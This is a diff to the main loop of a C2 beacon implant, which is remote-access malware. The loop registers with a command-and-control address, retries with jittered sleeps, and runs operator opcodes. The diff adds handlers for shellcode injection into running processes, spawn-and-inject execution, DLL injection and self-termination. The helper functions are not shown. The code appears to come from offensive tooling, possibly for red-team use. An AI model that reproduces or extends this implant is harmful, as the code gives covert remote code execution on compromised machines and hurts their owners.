@@ -7,7 +7,7 @@
 
 // main header file
 
-#include "core.h"
+// #include "core.h"
 #include "beacon.h"
 
 // dynamic header file, contains all info for callback
@@ -71,14 +71,14 @@ void main()
     while (!BeaconRegisterC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, (LPCWSTR)UriBuffer, dwSize))
     {
         // not much we can do really if we cant hit the c2, guess we just wait an retry.
-        DEBUG("Failed to connect\n");
+        DEBUG("FAILED: BeaconRegisterC2");
         Sleep(_CALLBACK_JITTER);
     }
 
     // callback to the c2 and check if theres a commands to run, if so check what it is and run it. If the command then fails to run, report this back to the c2.
 
     while (TRUE)
-    {   
+    {
 
         Buffer = BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, &OpCode, NULL, NULL, NULL);
 
@@ -88,25 +88,33 @@ void main()
             // no task, just sleep an check in later
             Success = TRUE;
             break;
-        
+
         case 0x2000:
-            // execute module, this is much stealthier
-            Success = ExecuteCode(Buffer, TRUE);
+            // inject shellcode into a running process
+            Success = InjectExecuteCode(Buffer);
             break;
 
         case 0x3000:
-            // execute code provided from the user, execution method is diffrent
-            // because the users will want output from there code. Also the module
-            // code execution technique wont work so well will variable code 
-            // provided by a user.
-            Success = ExecuteCode(Buffer, FALSE);
+            // spawn a process and inject code into its main thread
+            Success = SpawnExecuteCode(Buffer);
             break;
-        
+
         case 0x4000:
             // stdlib command so lets run it
             Success = Stdlib(Buffer);
             break;
+
+        case 0x5000:
+            // inject a dll into a running process
+            Success = InjectExecuteDll(Buffer);
+            break;
+
+        case 0x6000:
+            // beacon will die
+            return;
         }
+
+        free(Buffer);
 
         if (!Success)
         {
@@ -115,7 +123,7 @@ void main()
 
         Sleep(_CALLBACK_JITTER);
     }
-    
+
     // really should not hit this, so if it does lets just die
     DieCleanly();
 }
